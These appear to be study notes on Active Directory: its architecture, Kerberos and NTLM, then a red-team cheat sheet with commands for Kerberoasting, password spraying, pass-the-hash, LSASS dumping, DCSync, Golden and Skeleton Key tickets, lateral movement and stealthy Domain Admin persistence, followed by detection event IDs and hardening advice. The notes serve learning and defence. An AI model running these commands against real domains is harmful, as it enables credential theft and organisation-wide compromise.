# Active Directory: Architecture, Attacks, and Defense  
## Part One  
### Why AD matters?
- Used in ~90% of enterprise environments  
- Centralized IAM  
- Controls authentication, authorization, and policy enforcement  
- Backbone of Windows enterprise networks  
- Often the primary target during red team operations  
- If AD falls, the entire organization falls  

This is why there are so many tools built around AD security. If you understand AD, you understand the environment.

---

### AD vs Azure AD vs Entra ID  
#### Active Directory (AD DS)
- On-premises directory service  
- Uses LDAP, Kerberos, NTLM  

LDAP (Lightweight Directory Access Protocol): Used to manage and access directory information over a network.  

Kerberos: Network authentication protocol that uses the KDC to authenticate users securely.  

#### Azure AD (Legacy Name)
- Cloud identity service  

#### Microsoft Entra ID
- New branding of Azure AD  
- Identity-as-a-Service (IDaaS)  
- Uses OAuth, SAML, OpenID Connect  

#### Key Differences
- AD = Domain-based identity  
- Entra ID = Cloud identity provider  
- Hybrid = AD + Entra sync  

---

### What is a Domain?
A domain is a grouping of objects such as:
- Users  
- Computers  
- Groups  
- Policies  

These share:
- A database  
- Security policies  
- A trust boundary  

Example: `corp.local`  

Some components get special permissions while others do not. You might have subdomains like HR or Sales that operate under the same forest but with separated access and delegated control.

---

### Forest Concept
The forest is the highest logical container in AD. It contains:
- Domains: Logical groupings of objects that share a database and policies  
- Trees: Groups of domains that share a contiguous namespace  
- Schema: The blueprint that defines object types and attributes  

Notable aspects:
- Single schema across the entire forest  
- True security boundary in AD  

---

### Tree Structure
A hierarchical domain namespace. Example with `corp.local`:
- sales.corp.local  
- hr.corp.local  

These share a contiguous namespace and have automatic two-way transitive trust.

---

### Trust Relationships
Types:
- Parent-child trust: Automatically created when a child domain is added to a parent domain. This is a two-way, transitive trust by default and allows resources to be accessed across the domain hierarchy.
- External trust: A trust created between two separate domains that are not in the same forest. This is usually non-transitive and can be one-way or two-way depending on configuration.
- Forest trust: A trust relationship between two different forests. This is typically transitive across all domains in both forests and is often used during mergers or large enterprise integrations.
- Shortcut trust: A manually created trust between two domains in the same forest to reduce authentication path length and improve performance.

Properties:
- Transitive vs non-transitive: If A trusts B and B trusts C, then A trusts C in a transitive trust. Non-transitive does not extend trust beyond the direct relationship.  
- One-way vs two-way: One-way means trust flows in a single direction. Two-way means both domains trust each other.  

Trust misconfigurations create lateral movement opportunities.

---

### Logical vs Physical Structure
#### Logical Structure
- Domains  
- OUs (Organizational Units): Containers used to organize and manage users, groups, and computers  
- Trees  
- Forests  

#### Physical Structure
- Domain Controllers: Servers that host AD DS and handle authentication  
- Sites: Represent physical locations for replication optimization  
- Subnets: Define IP ranges associated with sites  

Logical = Administrative structure  
Physical = Replication and network optimization  

---

### Domain Controller Role
A domain controller:
- Hosts AD DS: Stores directory data and enforces policies  
- Stores NTDS.dit: The AD database file  
- Authenticates users  
- Issues Kerberos tickets  
- Handles replication between DCs  

If a DC is compromised, the entire domain is compromised.

---

### FSMO Roles Overview
Flexible Single Master Operations. Only one holder per role.

#### Forest-wide Roles
- Schema Master: Controls schema modifications  
- Domain Naming Master: Manages adding or removing domains  

#### Domain-wide Roles
- RID Master: Allocates RID pools to DCs  
- PDC Emulator: Handles password updates, time sync, and lockouts  
- Infrastructure Master: Maintains cross-domain references  

---

### Schema Master
- Controls AD schema modifications  
- Adds new object classes or attributes  
- Rarely used role  
- Forest-wide impact  
A schema is the blueprint of AD. It defines what objects and attributes can exist.

Attack vector: Schema tampering can create long-term persistence.

---

### Domain Naming Master
- Adds or removes domains in the forest  
- Ensures unique namespaces  

It prevents duplicate names like `hr.corp.local` and `HR.corp.local`.  

If compromised, attackers could create malicious domains as a backdoor.

---

### RID Master
- Allocates RID pools to DCs  
- Ensures unique SIDs  

Risks:
- RID hijacking  
- SIDHistory abuse: Reusing old SIDs to escalate privileges  

---

### PDC Emulator
Critical for:
- Password changes  
- Account lockouts  
- Time synchronization  
- NTLM fallback authentication  

High-value target for attackers. If compromised, authentication control can be manipulated.

---

### Infrastructure Master
- Maintains cross-domain object references  
- Updates group memberships across domains  

Important in multi-domain environments.

---

### AD Database (NTDS.dit)
Location: `C:\Windows\NTDS.dit`  

Stores:
- User objects  
- Password hashes  
- Group information  
- Kerberos keys  

Extraction results in a full credential dump.

---

### SYSVOL (System Volume)
Location: `C:\Windows\SYSVOL`  

Contains:
- GPO templates  
- Logon scripts  
- Policies  

Replicates across DCs. Misconfigurations can lead to GPO abuse.

---

### DNS and AD Integration
AD depends heavily on DNS for:
- Domain controller location  
- Service records (SRV): Used to locate services like LDAP and Kerberos  
- Kerberos resolution  

No DNS means AD does not function properly.

---

### LDAP
Used for:
- Querying AD  
- Modifying objects  
- Authentication through bind requests  

Ports:
- 389 LDAP  
- 636 LDAPS  

If LDAP signing is disabled, it creates an easy attack surface.

---

### Kerberos Overview
Default authentication protocol in AD.

Key components:
- KDC: Runs on the domain controller and issues tickets  
- TGT: Ticket Granting Ticket used to request service tickets  
- TGS: Ticket Granting Service exchange  
- Service Tickets: Used to access specific services  

Mutual authentication protocol.

---

### NTLM Authentication
Legacy authentication protocol.

Flow:
- Challenge-response mechanism  
- Hash-based authentication  

Weaknesses:
- NTLM relay attacks  
- Pass-the-hash attacks  

Still widely enabled in many environments.

---

### Kerberos Ticket Flow
1. Client → KDC: AS-REQ  
2. KDC → Client: TGT  
3. Client → KDC: TGS-REQ  
4. KDC → Client: Service Ticket  
5. Client → Service  

No passwords are sent across the network.

---

### TGT vs TGS
TGT:
- Ticket Granting Ticket  
- Used to request other tickets  
- Valid ~10 hours by default  

TGS:
- Service-specific ticket  
- Used to access a specific service  

Golden Ticket: Forged TGT  
Silver Ticket: Forged TGS  

TGT grants broader access than TGS.

---

### SPN (Service Principal Names)
Identifier for service accounts.

Format:
- Service/hostname  

Used in:
- Kerberoasting: Extracting service ticket hashes and cracking them offline  

Misconfigured SPNs can expose credentials.

---

### SID and RID
SID = Security Identifier  

Structure:
- Domain SID  
- RID: Unique identifier for an object within a domain  

Example:
- S-1-5-21-XXXXX-500  

500 = Administrator  

Important RIDs:
- 500 = Administrator  
- 512 = Domain Admins  
- 518 = Schema Admins  

SIDHistory:
- Used in migrations  
- Can be abused for privilege escalation  

---

### Access Tokens
Created after successful authentication. Contain:
- User SID  
- Group SIDs  
- Privileges  

Authorization decisions are based on tokens.

---

### DACL and SACL
DACL:
- Defines permissions  
- Allow or deny access  

SACL:
- Defines auditing rules  

Misconfigured DACLs can lead to privilege escalation.

---

### Inheritance in ACLs
Permissions propagate from parent containers.

Can be:
- Enabled  
- Blocked  

OU-level misconfigurations can result in domain compromise.

---

### Group Nesting
Groups inside other groups.

Scopes:
- Global: Used within the same domain  
- Domain Local: Grants permissions to resources in a domain  
- Universal: Used across domains in a forest  

Complex nesting can lead to privilege creep.

---

### Organizational Units (OU)
Container for:
- Users  
- Computers  
- Groups  

Used for:
- Delegation of administrative control  
- GPO linking  

Not a security boundary.

---

### Group Policy Objects (GPO)
Centralized policy enforcement.

Controls:
- Password policies  
- Software deployment  
- Firewall rules  
- Scripts  

Powerful administrative mechanism.

---

### GPO Processing Order (LSDOU)
- Local  
- Site  
- Domain  
- OU  

Last applied has highest precedence.

---

### Authentication vs Authorization
- Authentication = Who are you?  
- Authorization = What can you do?  

Both are controlled by AD.

---

### Delegation Types
Unconstrained Delegation:
- High risk  
- Stores TGTs in memory  

Constrained Delegation:
- Limited to specific services  
- Reduces attack surface  

Resource-Based Constrained Delegation:
- Configured on the resource side  
- More flexible and commonly abused  

Delegation abuse enables lateral movement.

---

### Service Accounts
Used to run services. Often:
- Weak passwords  
- Rarely rotated  
- Highly privileged  

Common Kerberoasting targets.

---

### Managed Service Accounts (MSA)
- Automatic password management  
- Single machine usage  
- Reduces manual overhead  

---

### gMSA
- Used across multiple servers  
- Automatic password rotation  
- Requires KDS root key  
- More secure alternative to traditional service accounts  

---

### AdminSDHolder
Special object in AD that protects:
- Domain Admins  
- Enterprise Admins  
- Other privileged accounts  

Overrides permissions every 60 minutes. Abuse can create persistence.

---

### Protected Users Group
Prevents:
- NTLM authentication  
- Weak Kerberos encryption like DES  
- Delegation  

Reduces credential theft risk.

---

### Read-Only Domain Controllers (RODC)
- Used in branch offices  
- Read-only AD copy  
- Limited credential caching  

Improves security in remote sites.

---

### Replication Process
Multi-master replication.

Uses:
- RPC: For directory replication  
- DFSR: For SYSVOL replication  

Replication abuse can enable DCSync attacks.

---

### AD Sites and Subnets
Defines:
- Physical network topology  
- Replication paths  

Improves authentication efficiency.

---

### Tombstones and Object Deletion
Deleted objects are:
- Marked as tombstones  
- Retained ~180 days by default  

Can be restored within the retention window.

---

### Global Catalog
Partial replica of all objects.

Used for:
- Forest-wide searches  
- Universal group membership lookups  

Runs on port 3268 by default.

---

### BloodHound Overview

Tool for:
- Mapping AD attack paths  
- Visualizing privilege escalation paths  

Uses:
- Neo4j database  
- SharpHound data collector  

Finds shortest paths to Domain Admin.

---

### AD Attack Surface
Includes:
- Kerberos abuse  
- NTLM relay  
- Delegation abuse  
- ACL abuse  
- Credential dumping  
- GPO abuse  
- DCSync attacks  

---

### Common AD Misconfigurations
- Weak service account passwords  
- Overprivileged groups  
- Unrestricted delegation  
- No LDAP signing  
- NTLM enabled  
- Unpatched domain controllers  

Most AD breaches come down to misconfigurations.

---

### Lab Architecture Overview
Typical Red Team Lab:
- 1 Domain Controller  
- 1 Windows client  
- 1 Attacker machine  

Optional:
- File server  
- SQL server  
- Web application  

Used to simulate:

- Lateral movement  
- Privilege escalation  
- Credential dumping  

---

### Quiz Reinforcement: Advanced AD Concepts
These quizzes focused on chaining concepts together instead of looking at attacks in isolation. The goal was to think like an attacker operating inside real-world constraints.

Key themes reinforced:
- Cross-forest privilege escalation: Understanding how forest trusts work, why selective authentication matters, and how SIDHistory combined with Enterprise Admin membership can break trust boundaries.
- RID Master abuse: How controlling RID allocation enables SID collision attacks and the creation of Administrator-equivalent accounts through manipulated RID assignment.
- Unconstrained delegation abuse: Dumping cached TGTs from memory when privileged users authenticate to a delegated system.
- Encryption weaknesses: Why RC4 support directly benefits Kerberoasting and Silver Ticket attacks.
- GPO precedence: OU-level GPO overriding domain-level password policy under LSDOU processing.
- SIDHistory mechanics: Authorization evaluates SIDHistory entries during access token construction, which enables privilege escalation if abused.
- Replication rights and DCSync: “Replicating Directory Changes” permissions are enough to perform DCSync without Domain Admin membership.
- AdminSDHolder persistence: Malicious ACLs applied every 60 minutes to protected accounts.
- LDAP relay impact: When LDAP signing is disabled and NTLM is enabled, attackers can modify AD objects without valid credentials.
- Service account risk: SPNs + non-rotating passwords + elevated group membership makes Kerberoasting the fastest escalation path.
- Access token construction: Nested group membership works because cumulative SIDs are added to the token during authentication.
- RODC limitations: Credential caching is selective and compromise has a limited blast radius compared to writable DCs.
- Global Catalog relevance: Enables forest-wide enumeration of group membership during lateral movement.
- PDC Emulator role: Time synchronization is critical for Kerberos ticket validation.
- Resource-Based Constrained Delegation abuse: Control over a computer object ACL enables impersonation of privileged users.
- Tombstone lifecycle: Deleted privileged accounts can be restored within the retention window with original SID intact.
- SYSVOL compromise: Modifying logon scripts can deploy payloads domain-wide.
- Domain Naming Context ACL abuse: Granting replication extended rights enables DCSync without modifying group membership.
- RBCD attack chaining: Combining controlled machine accounts, S4U2Self and S4U2Proxy, and delegation misconfiguration to impersonate Domain Admin without Golden Tickets or LSASS dumping.

Overall, the quizzes reinforced:
- AD security is about permissions, not just group membership  
- Extended rights and ACLs are often more dangerous than obvious admin roles  
- Delegation, replication, and trust boundaries are high-impact attack surfaces  
- Small misconfigurations stack into full domain compromise  
- Defensive controls must break the chain early, not just protect Domain Admin  

---

## Part Two: AD Offensive and Defensive Techniques  
### Initial Foothold in Domain
Common entry points:
- Phishing leading to stolen user credentials  
- NTLM hash leaks through SMB or responder-style attacks  
- VPN credential reuse from password breaches  
- Compromised web server pivoting internally  
- Local admin access on a domain-joined machine  

Once one machine is owned, the real game begins.

---

### Post-Compromise Checks
Basic situational awareness:
`whoami`  
`whoami /groups`  
`hostname`  
`ipconfig /all`  
`nltest /dsgetdc:domain.local`  

Check domain connectivity:
`echo %logonserver%`  

This confirms domain membership and identifies which DC is handling authentication.

---

### Domain Enumeration Techniques
#### Native Tools
`net user /domain`  
`net group "Domain Admins" /domain`  
`net accounts /domain`  

Quick and built in. Low noise if used carefully.

#### PowerShell
`Get-ADUser -Filter *`  
`Get-ADGroup -Filter *`  

More flexible and scriptable.

#### SharpHound
`SharpHound.exe -c All`  

Goal: Identify high value targets and discover paths for privilege escalation.

---

### PowerView Basics
Import:
`Import-Module .\PowerView.ps1`  

Enumerate users:
`Get-DomainUser`  

Find privileged accounts:
`Get-DomainGroupMember "Domain Admins"`  

Find Kerberoastable accounts:
`Get-DomainUser -SPN`  

---

### SharpHound Data Collection
Collection methods:
`SharpHound.exe -c All`  
`SharpHound.exe -c Session`  
`SharpHound.exe -c ACL`  

This generates a ZIP file that can be uploaded into BloodHound. The GUI visually maps relationships and privilege paths inside AD.

---

### Attack Path Example
user > WriteDACL > Service Account > Domain Admin  

If a user can modify DACLs, they can grant rights to themselves over a privileged service account. From there, escalation becomes very realistic.

---

### LDAP Enumeration
Linux:
`ldapsearch -x -h dc.domain.local -b "DC=domain,DC=local"`  

With credentials:
`ldapsearch -x -D user@domain.local -W -b "DC=domain,DC=local"`  

Goal:
- Dump users  
- Dump groups  
- Identify service accounts  

Only useful once authenticated access is gained.

---

### Credential Attacks
#### Password Spraying
Tool: CrackMapExec  
`crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2025!'`  

Low lockout risk. One password against many accounts.

Mitigation:
- Fine-grained password policies  
- Account lockout thresholds  

---

### Brute Force Risks
Example:
`hydra -L users.txt -P passwords.txt smb://192.168.1.10`  

Risks:
- Account lockout  
- SOC detection  
- High noise  

Spraying is quieter than brute force.

---

### Kerberoasting
- Target SPN accounts  
- Request TGS  
- Crack offline  

Find SPNs:
`Get-DomainUser -SPN`  

Request ticket:
`Invoke-Kerberoast`  

Linux:
`GetUserSPNs.py domain.local/user:password -dc-ip x.x.x.x -request`  

Crack:
`hashcat -m 13100 hash.txt wordlist.txt`  

No admin required.

---

### AS-REP Roasting
Targets accounts with Kerberos preauthentication disabled.

Find:
`GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip x.x.x.x`  

Crack:
`hashcat -m 18200 hash.txt wordlist.txt`  

Works without valid credentials.

---

### NTLM Relay
Tool:
`ntlmrelayx.py -tf targets.txt -smb2support`  

Often combined with:
- Responder  
- Printer bug coercion  

Mitigation:
- Enforce SMB signing  
- Disable NTLM  

---

### Pass-the-Hash
`psexec.py administrator@target -hashes LMHASH:NTHASH`  

Or:
`evil-winrm -u administrator -H NTHASH -i target`  

Authenticates using NTLM hash instead of plaintext password.

---

### Pass-the-Ticket
Export:
`mimikatz # sekurlsa::tickets /export`  

Inject:
`mimikatz # kerberos::ptt ticket.kirbi`  

Reuses valid Kerberos tickets.

---

### Overpass-the-Hash
`mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH`  

Creates a Kerberos ticket from an NTLM hash.

---

### Credential Dumping (LSASS)
Dump:
`procdump.exe -ma lsass.exe lsass.dmp`  

Extract:
`mimikatz # sekurlsa::minidump lsass.dmp`  
`mimikatz # sekurlsa::logonpasswords`  

Mitigation:
- Credential Guard  
- LSASS protection  

---

### DCSync Attack
Requires replication privileges.
`mimikatz # lsadump::dcsync /user:krbtgt`  

Steals KRBTGT hash.

---

### DCShadow Attack
Registers rogue DC.
`mimikatz # lsadump::dcshadow /push`  

Injects malicious directory changes.

---

### Golden Ticket Attack
Create:
`kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt`  

Valid until KRBTGT password is reset twice.

Detection:
- Unusual TGT lifetime  
- Event ID 4769 anomalies  

---

### Silver Ticket Attack
Forge service ticket:
`kerberos::golden /service:cifs /target:server.domain.local /rc4:HASH /ptt`  

No DC communication required.

Required parameter: Service account hash.

---

### Skeleton Key Attack
`mimikatz # misc::skeleton`  

Injects a master password into DC memory. Volatile but extremely dangerous.

---

### Privilege Escalation via ACL Abuse
Enumerate:
`Get-ObjectAcl -ResolveGUIDs`  

WriteDACL abuse:
`Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All`  

Misconfigured GenericAll permissions are a common escalation path.

---

### RBCD
Create machine account:
`New-MachineAccount`  

Configure delegation and impersonate high privilege users.

Tool:
`Rubeus.exe s4u`  

---

### Unconstrained Delegation Abuse
Find:
`Get-DomainComputer -Unconstrained`  

Captures TGTs of privileged users when they authenticate.

---

### GPO Abuse
Modify GPO:
`Set-GPRegistryValue`  

Can push malicious scripts or add local admins.

---

### AdminSDHolder Abuse
Enumerate:
`Get-ObjectAcl "CN=AdminSDHolder,CN=System,DC=domain,DC=local"`  

Modifying this object grants persistent control over protected accounts.

---

### SID History Injection
`mimikatz # sid::add`  

Injects a privileged SID into a user’s SIDHistory attribute.

---

### Exploiting Trust Relationships
Enumerate:
`Get-DomainTrust`  

Abuse misconfigured trust boundaries to move between domains or forests.

---

### Cross-Forest Attacks
Abuse:
- SID filtering misconfigurations  
- Selective authentication weaknesses  

---

### Printer Bug and Coercion
Force authentication:
`SpoolSample.exe DC attacker`  

Relay via ntlmrelayx.

---

### Lateral Movement
#### SMB
`crackmapexec smb targets.txt -u user -p pass --exec-method smbexec`  

#### WMI
`wmiexec.py domain/user:pass@target`  

#### PSExec
`psexec.py domain/user:pass@target`  

#### WinRM
`evil-winrm -i target -u user -p pass`  

### Remote Service Creation
`sc.exe \\target create service`  

---

### Persistence
#### Golden Ticket Persistence
Valid until KRBTGT reset twice.

#### Silver Ticket Persistence
Harder to detect due to no DC logging.

#### Backdoored GPO
Add scheduled tasks through policy.

#### Shadow Credentials
Abuse `msDS-KeyCredentialLink`  

Tool:
`Whisker.exe add`  

Creates stealth authentication material.

#### Stealth Domain Admin Addition
`net group "Domain Admins" attacker /add /domain`  

Then hide in:
- Disabled OU  
- Fake naming patterns  

---

### Detection and Mitigation
#### Logging Requirements
Enable:
- Advanced audit policy  
- PowerShell logging  
- Directory service access auditing  

#### Important Event IDs
- 4624: Logon  
- 4625: Failed logon  
- 4672: Special privileges assigned  
- 4768: TGT request  
- 4769: TGS request  
- 4662: Directory replication  

Kerberoasting detection:
- High volume of 4769  
- RC4 encryption usage  

DCSync detection:
- 4662 with replication GUID  
- Non-DC account performing replication  

---

### Hardening Measures
#### NTLM Relay Mitigation
- Enforce SMB signing  
- Disable NTLM where possible  
- Enable LDAP channel binding and EPA  

#### Delegation Hardening
- Avoid unconstrained delegation  
- Use constrained delegation  
- Monitor msDS-AllowedToDelegateTo  

#### Tiered Administration Model
- Tier 0: Domain controllers  
- Tier 1: Servers  
- Tier 2: Workstations  

Never mix credentials across tiers.

---

### ESAE Red Forest Model
Isolated privileged forest.

Used by:
- Large enterprises  
- High security organizations  

---

### LAPS Implementation
Deploy LAPS.

Prevents:
- Lateral movement using shared local admin passwords  

---

### Zero Trust in AD
Principles:
- Assume breach  
- Continuous verification  
- Least privilege  

---

### Secure Baseline Checklist
- SMB signing enabled  
- LDAP signing enabled  
- NTLM disabled where possible  
- Strong password policies  
- KRBTGT rotation  
- Audit privileged groups  

---

### Real World AD Breach Chain
Phish > LSASS dump > Kerberoast > Domain Admin > Golden Ticket > Persistence  

---

### Attack Chain Recap
1. Foothold  
2. Enumeration  
3. Credential access  
4. Privilege escalation  
5. Lateral movement  
6. Persistence  
7. Domain dominance  

---

### Blue Team vs Red Team View
Red:
- Find shortest path to Domain Admin  

Blue:
- Break the attack chain early  
- Monitor abnormal behavior  

---

### Quiz Reinforcement: AD Offensive Concepts
The quizzes focused on applying AD security concepts rather than memorizing commands. They reinforced how small misconfigurations combine to create escalation paths and why permissions and delegation are often the root of compromise.

Key ideas covered:
- Kerberoasting targets service accounts by requesting TGS tickets and cracking SPN hashes offline  
- AS-REP roasting works when preauthentication is disabled, allowing hash retrieval without credentials  
- NTLM hashes enable authentication through pass-the-hash techniques without knowing the password  
- DCSync abuses replication permissions to dump credentials without Domain Admin rights  
- Overpass-the-hash converts NTLM hashes into Kerberos tickets for service access  
- PowerView and SharpHound map AD relationships and attack paths for privilege escalation  
- LDAP enumeration reveals users and groups once access is obtained  
- NTLM relay attacks intercept authentication and reuse it against other services  
- Silver and golden tickets forge Kerberos tickets for persistence and broad access  
- SIDHistory allows old identifiers to be reused for privilege escalation  
- Access tokens and group memberships determine authorization  
- Unconstrained delegation enables TGT capture when privileged users authenticate  
- RBCD abuse chains delegation settings to impersonate higher-privilege accounts  
- AdminSDHolder and ACL abuse create persistent backdoors in protected objects  
- GPO modifications can deploy domain-wide changes and payloads  
- Tiered administration models limit credential exposure across system types  
- Defense focuses on breaking the attack chain early and monitoring anomalies

Overall, the quizzes emphasized that:
- AD security revolves around permissions and delegation  
- Misconfigurations stack to create domain compromise  
- Attack paths often bypass group membership through extended rights  
- Detection requires auditing replication, delegation, and authentication events  
- Hardening is about least privilege and boundary enforcement
